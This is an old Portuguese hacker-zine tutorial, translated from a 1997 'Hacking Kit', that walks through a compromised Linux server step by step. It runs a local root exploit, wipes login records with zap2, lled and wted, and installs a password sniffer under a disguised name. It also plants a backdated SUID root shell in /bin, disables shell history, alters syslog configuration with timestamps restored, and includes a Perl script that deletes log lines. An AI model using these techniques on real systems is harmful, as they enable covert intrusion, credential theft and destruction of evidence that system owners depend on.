<HTML>
<HEAD>
<TITLE>.pt zine - Limpar os log files</TITLE>
</HEAD>
<BODY BGCOLOR="Black" TEXT="#000000" LINK="Green" VLINK="Red">
<IMG SRC="pt_small.gif" WIDTH=452 HEIGHT=81 BORDER=0>
<P>
<FONT SIZE="5" FACE="Arial" COLOR="#FFC639">
<B>Limpar os log files:</B><BR>
------------------------------
</FONT>
<BR>
<FONT SIZE="3" FACE="Arial" COLOR="#FFC639">
traduzido por VectorX<BR>
IN: Hacking Kit v2.0.b March/97<BR>
BY: Invisible Evil
<P>

Uma volta pelo sistem hackado/ O ke fazer depois de hackar/ganhar root 
no sistema?
<P>
N&atilde;o posso deixar de referir a import&acirc;ncia que &eacute; a de limpar os logs, 
para assim n&atilde;o ser possivel detectar a vossa presen&ccedil;a no sistema.
Vamos agora realizar uma "visita guiada" por um sistema "hackado" e 
demonstrar o que devem fazer e o que devem procurar para limpar a vossa 
presen&ccedil;a do sistema. Para come&ccedil;ar vamos fazer o login num sistema :
<P>
Segue-se uma explica&ccedil;&atilde;o passo-a-passo de todo o processo:
<P>
******----> ver quem est&aacute; na maquina 
<PRE>
[/home/master]finger @victim.net
[victim.net]
No one logged on.
</PRE>
******----> de momento n&atilde;o se encontra ninguem, nesse caso 
	    podemos entrar em seguran&ccedil;a
<PRE>
[/home/master]telnet victim.net

Trying xxx.206.xx.140...
Connected to victim.net.
Escape character is '^]'.

Welcome to Victim Research Linux (http://www.victim.net) Red Hat 4.2
Kernel 2.0.30 on a i586


ns.victim.net login: jnsmith
Password:
Linux 2.0.30.
You have new mail.
</PRE>
******----> N&atilde;o leias o mail do user, se quiseres podes ver todo o mail 
            atrav&eacute;s do comando : cat /var/spool/mail e tamb&eacute;m em 
	    /home/username/mail .

<P>
******----> Voltamos a ver se est&aacute; mais alguem no sistema (comando w(ho) )
<PRE>
[jnsmith@ns jnsmith]$ w

5:36am  up 18 days,  8:23,  1 user,  load average: 0.01, 0.00, 0.00
User      tty       login@  idle   JCPU   PCPU  what
jnsmith   ttyp1     5:35am                      w
</PRE>
******----> S&oacute; estou c&aacute; eu, nesse caso vamos ganhar root e limpar 
	    a nossa presen&ccedil;a do log file : utmp
<PRE>
[jnsmith@ns jnsmith]$ cd .term
</PRE>
******----> Esta dir j&aacute; tinha sido pr&eacute;viamente criada 
	    (.term &eacute; um bom nome para uma dir onde queiras esconder cenas)
<PRE>
[jnsmith@ns .term]$ ./.u
</PRE>
******----> J&aacute; tinha isto &agrave; minha espera : &eacute; o exploit mount/umount (mount.c)
<P>
Este bug foi descoberto e programado pelo Bloodmask e pelo Vio em 1996

******----> Agora que j&aacute; ganh&aacute;mos root vamos usar o z2 (zap2) 
	    para nos tornarmos "invis&iacute;veis"
<PRE>
bash# z2 jnsmith
Zap2!
</PRE>
******----> Vamos ver se ainda estamos no sistema...
<PRE>
bash# w
5:37am  up 18 days,  8:24,  0 users,  load average: 0.08, 0.02, 0.01
User     tty       login@  idle   JCPU   PCPU  what
</PRE>
******----> Hmmm... interessante, agora n&atilde;o est&aacute; ninguem no sitema.
	    Bem... devo ter saido do sistema ;) <P>
******----> J&aacute; sabemos que somos root no sistema, mas mesmo 
	    assim vamos confirmar :
<PRE>
bash# whoami
root
bash#
</PRE>
******----> Yeps, somos root... Em que directoria &eacute; que estamos?
<PRE>
bash# pwd
/home/jnsmith/.term
</PRE>
******----> Agora vamos verificar os logs do sistema
<PRE>
bash# cd /var/log
</PRE>
******----> maior parte das vezes est&atilde;o em /var/adm, mas neste caso est&atilde;o 
	    em /var/log
<PRE>
bash# grep dormroom *
maillog:Jan 29 05:31:58 ns in.telnetd[22072]: connect from dormroom.playhouse.com
maillog:Jan 29 05:35:29 ns in.telnetd[22099]: connect from dormroom.playhouse.com
</PRE>
******----> Yaps, o z2 (zap2) limpou tudo menos este maillog ...
<PRE>
bash# pico maillog
</PRE>
******----> no pico eu fiz ctrl w, e procurei por "dormroom" e depois fiz ctrl k 
            para apagar as linhas n&atilde;o desejadas.
<P>

******----> Estas foram as linhas apagadas :
<PRE>
Jan 29 05:31:58 ns in.telnetd[22072]: connect from dormroom.playhouse.com
Jan 29 05:35:29 ns in.telnetd[22099]: connect from dormroom.playhouse.com

bash# grep dormroom *
</PRE>
******----> Yep, est&aacute; tudo limpo
<PRE>
bash# w
5:41am  up 18 days,  8:27,  0 users,  load average: 0.00, 0.00, 0.00
User     tty       login@  idle   JCPU   PCPU  what
</PRE>
******----> Yep .. aqui tamb&eacute;m est&aacute; tudo limpo ;)
<P>
******----> Agora vamos mostrar-vos como &eacute; que iriam usar o "lled" e o "wted"
            se por acaso quando fizemos "grep", tivesse surgido mais qualquer 
	    coisa nesses files.
<PRE>

bash# cd ~jnsmith/.term
bash# lled
bash# lled -c dormroom.playhouse
Entries stored: 527 Entries removed: 0
</PRE>
Agora fa&ccedil;am 'chmod lastlog.tmp' e copiem para cima do file original 
em /var/log/lastlog

******----> Nada no lastlog ...
<PRE>
bash#
bash# wted -e jnsmith
Entries stored: 254 Entries removed: 0
Now chmod wtmp.tmp and copy over the original /var/log/wtmp
</PRE>
******----> Nada no wtmp, ambos estes files teriam surgido no "grep"
            n&oacute;s s&oacute; o execut&aacute;mos em /var/log (s&oacute; para mostrar os comandos)
<P>
******----> Que tal por um sniffer a correr?
<PRE>
bash# pico linsniffer.c
</PRE>
******----> Eu alterei esta linha para definir a localiza&ccedil;&atilde;o do log 
do sniffer :
<PRE>
#define TCPLOG "/tmp/.pinetemp.000"
</PRE>
******----> vamos ver que processos &eacute; que est&atilde;o a correr para atribuirmos ao 
            sniffer um nome que se assemelhe a algo que esteja a correr.
<PRE>
bash# ps -aux

root       143  0.0  0.0   84    0  ?  SW  Jan 10   0:01 (lpd)
root       154  0.0  0.0  118    0  ?  SW  Jan 10   0:00 (smbd)
root       163  0.0  0.5   76  176  ?  S   Jan 10   0:00 nmbd -D
root       197  0.0  0.0   76    0 v03 SW  Jan 10   0:00 (getty)
root       198  0.0  0.0   76    0 v04 SW  Jan 10   0:00 (getty)
root       199  0.0  0.0   76    0 v05 SW  Jan 10   0:00 (getty)
root       200  0.0  0.0   76    0 v06 SW  Jan 10   0:00 (getty)
root       201  0.0  0.0   88    0 s00 SW  Jan 10   0:00 (uugetty)
root       209  0.0  0.2   35   76  ?  S   Jan 10   0:01 (update)
root       210  0.0  0.3   35  124  ?  S   Jan 10   0:03 update (bdflush)
root     10709  0.0  1.4  152  452  ?  S   Jan 27   0:10 httpd
root     11111  0.0  1.4  152  452  ?  S   Jan 27   0:07 httpd
root     14153  0.0  0.8   70  268  ?  S   Jan 16   0:03 ./inetd
root     14307  0.0  4.7 1142 1484  ?  S   Jan 16   1:16 ./named
root     14365  0.0  0.0   76    0 v02 SW  Jan 16   0:00 (getty)
root     17367  0.0  1.4  152  452  ?  S    11:01   0:02 httpd
</PRE>
******----> vamos compila-lo e dar-lhe o nome de nmb
<PRE>
bash# gcc linsniffer.c -o nmb
</PRE>
******----> vamos execut&aacute;-lo
<PRE>
bash# nmb&
[1] 22171
</PRE>
******----> vamos verificar o log file em /tmp
<PRE>
bash#
bash# cd /tmp
bash# ls -al .pin*
total 15691
-rw-rw-r--   1 root     jnsmith          0 Jan 29 05:50 .pinetemp.000
</PRE>
******----> Ali est&aacute; ele. No entanto n&oacute;s n&atilde;o queremos que o user da account 
	    que estamos a utilizar saiba nem da exist&ecirc;ncia nem do cont&eacute;udo 
	    deste file, ent&atilde;o fazemos : 
<PRE>
bash# chgrp root .pin*
</PRE>
******----> Vamos ver agora ...
<PRE>
bash# ls -al .pin*
-rw-rw-r--   1 root     root            0 Jan 29 05:50 .pinttemp.000
bash#
</PRE>
******----> &Oacute;ptimo, agora vamos criar uma SUID shell para n&atilde;o termos 
	    que voltar a fazer isto.

<PRE>
bash# cd /bin
bash# ls -l sh
lrwxrwxrwx   1 root     root            4 Mar  1  1996 sh -> bash
</PRE>
******----> &Eacute; apenas um sym link e n&atilde;o o file que nos interessa ...
<PRE>
bash# ls -l bash
-rwxr-xr-x   1 root     root       299296 Nov  2  1995 bash
</PRE>
******----> aqui est&aacute; o verdadeiro file (o que nos interessa pra criarmos 
          a tal shell).
	    Vamos pensar num nome para lhe atribuirmos, de forma a que pareca 
          que o file pare&ccedil;a pertencente a esta dir :
<PRE>
bash# ls
arch           df             ksh            ping           tar
ash            dmesg          ln             ps             tcsh
bash           dnsdomainname  login          pwd            true
cat            domainname     ls             red            ttysnoops
chgrp          echo           mail           rm             umount
chmod          ed             mkdir          rmdir          uname
chown          false          mknod          sed            vi
cp             findterm       more           setserial      view
cpio           gunzip         mount          sh             vim
csh            gzip           mt             stty           zcat
date           hostname       mv             su             zsh
dd             kill           netstat        sync
</PRE>
******----> Que tal criarmos um novo comando para Linux? Maior parte dos admins 
	    nem v&atilde;o dar pela diferen&ccedil;a ... Vamos atribuir-lhe o nome de "findhost"
	    (N&atilde;o te aconselho a utilizar este nome por raz&otilde;es obvias...)
<PRE>
bash# cp bash findhost
</PRE>
******----> ok, agora vamos l&aacute; ver o que &eacute; que o novo comando faz  ... ;)
<PRE>
bash# ls -l findhost
-rwxr-xr-x   1 root     jnsmith     299296 Jan 29 05:59 findhost
</PRE>
******----> Hmmm, temos que mudar o grupo (chgrp), e alterar a data e a hora 
	    do file atrav&eacute;s do comando 'touch' e torn&aacute;-lo SUID root (para que 
	    n&atilde;o haja suspeitas quanto ao file).
<PRE>
bash# chgrp root findhost
bash# ls -l findhost
-rwxr-xr-x   1 root     root       299296 Jan 29 05:59 findhost

bash# chmod +s findhost
bash# ls -l findhost
-rwsr-sr-x   1 root     root       299296 Jan 29 05:59 findhost

bash# touch -t 111312331995 findhost
bash# ls -l findhost
-rwsr-sr-x   1 root     root       299296 Nov 13  1995 findhost

bash# ls -l m*
-rwxr-xr-x   1 root     root        64400 Oct 31  1995 mail
-rwxr-xr-x   1 root     root         7689 Nov  2  1995 mkdir
-rwxr-xr-x   1 root     root         7001 Nov  2  1995 mknod
-rwxr-xr-x   1 root     root        20272 Nov  1  1995 more
-rwsr-xr-x   1 root     root        26192 Nov  1  1995 mount
-rwxr-xr-x   1 root     root         8381 Oct 31  1995 mt
-rwxr-xr-x   1 root     root        12753 Nov  2  1995 mv
</PRE>
******----> Agora sim, parece mesmo que pertence a esta dir
            Vamos agora confirmar se este "comando" faz exactamente aquilo 
	    que pretendiamos, ou seja dar-nos root. Para tal, em primeiro lugar 
	    saimos da shell em que estamos :
<PRE>
bash# exit

[jnsmith@ns .term]$ cd /bin
[jnsmith@ns /bin]$ whoami
jnsmith
[jnsmith@ns /bin]$ findhost
[jnsmith@ns /bin]# whoami
root
</PRE>
******----> Optimo, o nosso comando funciona ;)
<PRE>
[jnsmith@ns /bin]# cd
</PRE>
******----> cd {enter} leva-nos de volta para a nossa home dir
<PRE>
[jnsmith@ns jnsmith]# ls
mail
[jnsmith@ns jnsmith]# echo + +>test
[jnsmith@ns jnsmith]# ls -l
total 2
drwx------   2 jnsmith   jnsmith       1024 Jan 11 22:47 mail
-rw-rw-r--   1 root      root            4 Jan 29 06:11 test
</PRE>
******----> Agora temos uid=0 e gid=0
<PRE>
[jnsmith@ns jnsmith]# rm test
</PRE>
******----> por enquanto tudo bem .....
<PRE>
[jnsmith@ns jnsmith]# w
6:12am  up 18 days,  8:58,  0 users,  load average: 0.07, 0.02, 0.00
User     tty       login@  idle   JCPU   PCPU  what
</PRE>
******----> S&oacute; para ter a certeza de que ainda estamos sozinhos ....
<PRE>
[jnsmith@ns jnsmith]# ls -al /tmp/.p*
total 15692
-rw-rw-r--   1 root     root          157 Jan 29 06:10 .pinttemp.000
</PRE>
******----> j&aacute; estamos a "apanhar" passwords ;)
<PRE>
[jnsmith@ns jnsmith]# ls -al
total 32
drwxrwx---   5 jnsmith   jnsmith   1024 Jan 29 06:11 .
drwxr-xr-x  33 root      users     1024 Jan 22 16:53 ..
-rw-r-----   1 jnsmith   jnsmith   1126 Aug 23  1995 .Xdefaults
lrwxrwxrwx   1 jnsmith   jnsmith      9 Jan  1 21:40 .bash_history -> /dev/null 
                                                             <- Aten&ccedil;&atilde;o a isto
-rw-r--r--   1 root      jnsmith     24 Jan  1 03:12 .bash_logout
-rw-r--r--   1 root      jnsmith    220 Jan  1 03:12 .bash_profile
-rw-r--r--   1 root      jnsmith    124 Jan  1 03:12 .bashrc
-rw-rw-r--   1 root      jnsmith   5433 Jan 11 22:47 .pinerc
drwxrwxr-x   2 jnsmith   jnsmith   1024 Jan 29 06:22 .term
drwxr-x---   2 jnsmith   jnsmith   1024 Feb 17  1996 .xfm
drwx------   2 jnsmith   jnsmith   1024 Jan 11 22:47 mail
[jnsmith@ns jnsmith]#
</PRE>
******----> Fa&ccedil;am um sym link de .bash_history para /dev/null para que
            n&atilde;o deixem o history dos vossos comandos.

Este &eacute; o comando para faz&ecirc;-lo, mas confirmem que apagaram o antigo 
.bash_history se ele l&aacute; estiver.
<PRE>
ln -s /dev/null .bash_history
</PRE>
Ok, agora fazemos logout ...
Ainda existe outra forma de nos vermos livres do .bash_history.
<P>
Se te lembrares sempre disto e practicares bastante de forma a NUNCA 
te esqueceres,  faz o seguinte :
<P>
SEMPRE que fa&ccedil;as login no sistema escreve : unset HISTFILE
<P>
Isto faz com que o .bash_history seja apagado sempre que sais do sistema.
Se usares este m&eacute;todo NUNCA te esquecas de fazer o que se disse!
<P>

<B>messages & syslog</B><P>

Na directoria dos logs, v&atilde;o encontrar um file chamado 'messages'. Cada sistema &eacute; 
differente no que se refere ao tipo do informa&ccedil;&atilde;o que &eacute; logada e para que 
file(s), &eacute; que essa informa&ccedil;&atilde;o vai. N&atilde;o te esque&ccedil;as de procurar no 
/etc/syslog.conf informa&ccedil;&atilde;o referente a sistemas remotos. Se o sistema estiver 
a logar essa informa&ccedil;&atilde;o vais ver algo semelhante a :
<PRE>
*.*                                 @somehostname.xxx
</PRE>
Podes tamb&eacute;m simplesmente ver neste file (/etc/syslog.conf) onde se encontram 
outros logfiles.
<P>
Aqui est&aacute; um exemplo...
<PRE>
bash# more syslog.conf
# /etc/syslog.conf
# For info about the format of this file, see "man syslog.conf" (the BSD man
# page), and /usr/doc/sysklogd/README.linux.
#
# NOTE: YOU HAVE TO USE TABS HERE - NOT SPACES.
# I don't know why.
#

*.=info;*.=notice                               /var/adm/messages
*.=debug                                        /var/adm/debug
*.warn                                          /var/adm/syslog
*.warn                                          /root/.../syslog
*.=crit;kern.none                               /var/adm/critical
kern.info;kern.!err                             /var/adm/kernel-info
mail.*;mail.!=info                              /root/.../mail
mail,news.=info                                 /root/.../info
mail.*;mail.!=info                              /var/adm/mail
mail,news.=info                                 /var/adm/info
*.alert                                         root,bob
*.=info;*.=notice                               @quality.com
*.=debug                                        @quality.com
*.warn                                          @quality.com
*.=crit;kern.none                               @quality.com
kern.info;kern.!err                             @quality.com
mail.*;mail.!=info                              @quality.com
mail,news.=info                                 @quality.com
</PRE>
Neste caso, alguns dos logs est&atilde;o em directorias escondidas (/root/.../syslog)
localizadas na dir /root, e uma c&oacute;pia de todos os alertas e avisos do sistema
est&atilde;o tamb&eacute;m a ser enviados para o host 'quality.com'.
O 'wtmp', 'utmp' e o 'lastlog' neste caso s&atilde;o locais, por isso n&atilde;o h&aacute; grande
problema. No entanto n&atilde;o uses o comando 'su' num sistema deste tipo (logs para
host remoto). Repara tamb&eacute;m que neste caso os avisos e alertas do sistema est&atilde;o
a ser enviados por mail ao root e ao user 'bob'.
<P>
Repara tamb&eacute;m que o 'syslog', 'mail', e 'info' est&atilde;o a ser enviados para a dir
/var/adm para nos levar a pensar que todos os logs est&atilde;o em /var/adm ! Assim,
se editares algo em /var/adm o admin do sistema pode correr um 'diff' nos backup
files na /root dir.
<P>
Ok, vais ent&atilde;o &agrave; dir /var/adm ou a /var/log e fazes:
<PRE>
grep o_teu_host * |more
grep o_teu_ip * |more
</PRE>
podes assim ver que alguns files est&atilde;o a logar a tua liga&ccedil;&atilde;o. Toma nota desses 
files e edita o file /etc/syslog.conf. Ir&aacute;s assim atrav&eacute;s de tentativa-e-erro 
fazer com que (na maior parte dos casos) fazer com que o log do teu domain 
n&atilde;o se realize.<BR>
No entanto deves prestar aten&ccedil;&atilde;o ao seguinte :
Depois de editares o file (/etc/syslog.conf) tens de reinicializar o 'syslogd'.
Podes faz&ecirc;-lo atrav&eacute;s do comando 'ps -x' :
<PRE>
$root> ps -x

39  ?  S    1:29 /usr/sbin/syslogd
</PRE>
procura o 'syslogd' na listagem de processos que vai aparecer e toma nota do 
process id (pid) do 'syslogd'. Neste caso o pid era o 39. Fazemos entao :
<PRE>
kill -HUP 39
</PRE>
Isto far&aacute; com que o processo seja reinicializado passando assim as nossas
altera&ccedil;&otilde;es a fazer efeito.
<P>
Outra coisa de que N&Atilde;O te podes esquecer &eacute; de fazer 'ls -l /etc/syslog.conf'
ANTES de editares esse file e tomar nota da informa&ccedil;&atilde;o relativa &agrave; data e hora
do file. Deves ent&atilde;o (depois de editares o file) usar o comando 'touch' para
que o file volte a ter a date e hora originais. Desta forma se o(s) admin(s) 
repararem que o log est&aacute; diferente v&atilde;o quase de certeza verificar a data e
hora do file. Ao verem que n&atilde;o sofreram altera&ccedil;&otilde;s, v&atilde;o pensar que se tratou 
de outra coisa qualquer. Maior parte dos admins nem sequer sabem configurar
este files para que funcione correctamente, por isso em grande parte dos casos
n&atilde;o h&aacute; qualquer problema em edit&aacute;-los.
<P>
Aqui est&aacute; outro file a que deves prestar aten&ccedil;&atilde;o :
<PRE>
/etc/login.defs

# Enable "syslog" logging of su activity - in addition to sulog file logging
# SYSLOG_SG_ENAB does the same for newgrp and sg.
#
SYSLOG_SU_ENAB          yes
SYSLOG_SG_ENAB          yes

#
# If defined, all su activity is logged to this file
#
SULOG_FILE      /home/users/bob/.list
</PRE>
Repara que h&aacute; um log file referente ao uso do comando 'su' (SULOG_FILE) que 
se encontra escondido na homedir de um dos admins do sistema.
<P>

<B>xferlog</B><P>


O 'xferlog' pode ser editado com qualquer editor de texto (pico, joe, vi, etc).
Podes ent&atilde;o procurar neste log file por transferencias de files que possas ter 
feito (por exemplo para enviares para o sistema o zap2).
Deves ent&atilde;o faz&ecirc;-lo SEMPRE que acabes de transferir algum file para o sistema.
<P>
Deves tamb&eacute;m usar o comando 'grep' nos files que se encontram na dir 
/usr/local/etc/httpd/log caso tenhas utilizado a web ou o phf neste sistema, 
de forma a que a tua presen&ccedil;a seja assim eliminada desses files.
Deves faz&ecirc;-lo da seguinte forma :
<PRE>
grep (username or hostname) * |more

</PRE>
Se tiveres que procurar os logs do httpd podes faz&ecirc;-lo atrav&eacute;s do comando
'find -name httpd.conf -print' e toma nota da localiza&ccedil;&atilde;o dos logfiles do
httpd.
<P>
Podem existir diferentes logs para as transferencias por ftp algures numa
dir de ftp ou virtual ftp. V&ecirc; os files em /etc/ftp* para descobrires que
configura&ccedil;&atilde;o para o ftp &eacute; utilizada neste sistema (e logo descobrires a 
localiza&ccedil;ao dos log files).
<P>
Tudo o que aqui foi dito relativamente a editar log files teve em conta 
que est&aacute;s a utilizar editores de texto como o pico, o joe ou qualquer outro 
do mesmo tipo.<BR>
Por vezes podes dar de caras com um log file muito grande e o editor que est&aacute;s
a usar, pode nao ter capacidade para abrir todo o file.
Nestes casos &eacute; mais simples, rapido e pr&aacute;ctico utilizares um outro m&eacute;todo :
<P>
Imagina que encontras-te um log file de 20 mb ... wow! e agora?
<P>
Imagina agora que querias retirar deste logfile todas as linhas que 
continham 'fudge.candy.com'. Fazias assim :
<PRE>
grep -v fudge.candy >messages.2
rm messages
mv messages2 messages
depois faz um 'kill -HUP <process id for syslogd>'
</PRE>
o '-v' serve para retirar tudo o que N&Atilde;O &eacute; qeuivalente &aacute; linha que queres.
Desta forma est&aacute;s a passar tudo o que deve ficar no file para um novo file 
(neste caso messages.2). Ficas-te ent&atilde;o com 2 files, o messages que agora 
cont&eacute;m apenas a informa&ccedil;&atilde;o que tu queres limpar e o messages.2 que cont&eacute;m a 
restante informa&ccedil;&atilde;o que n&atilde;o te diz respeito e logo deves mante-la no sistema.
De seguida apagas o messages e fazes rename do messages.2 para messages.
Limpas-te assim do log file a informa&ccedil;&atilde;o que n&atilde;o te era conveniente manter ;)
<P>
Isto aplica-se a qualquer logfile...

<P>
Aqui est&aacute; um script para Perl que faz o que se disse acima por ti :
<PRE>
------------------- start of riptext.pl
#!/usr/bin/perl
#
# RipText - Takes regular expression and filename argument from @ARGV. Any 
#           lines MATCHING regular expression will *not* be printed to 
#           STDOUT. 
# 
#

die("\nUsage: riptext [regexp] {filename}\n\n") if (!defined($ARGV[0]));
($regexp, $filename) = @ARGV[0,1];
# Read in contents of file.
$/ = undef;
$contents="";
if (!defined($filename)) {
  # Use STDIN.
  $contents = scalar <STDIN>;
} else {
  # Use FILE.
  open(FILE, "<$filename") || die("-RipText- Cannot open $filename: $!\n");
  $contents = scalar <FILE>;
  close(FILE);
}

@contents = split(/\n/, $contents);

# Strip file of matching lines.
open(FILE, ">$filename") || die("-RipText- Cannot write $filename: $!\n");
foreach (@contents) {
  print FILE "$_\n" unless (/$regexp/i);
}
close(FILE);

0;

------------------------ end of riptext.pl
</PRE>
Nunca te esque&ccedil;as de reinicializar o 'syslogd' depois de editares os
logs, pois ainda &eacute; possivel recuperar a informa&ccedil;&atilde;o que tu acabas-te de
alterar (pois ela ainda est&aacute; em memoria) at&eacute; tu reinicializares o processo!
<P>
Deves tamb&eacute;m editar o 'syslog' e retirar a informa&ccedil;&atilde;o relacionada com
o "restart" do 'syslogd'.
</PRE>
</FONT>
</BODY>
</HTML>
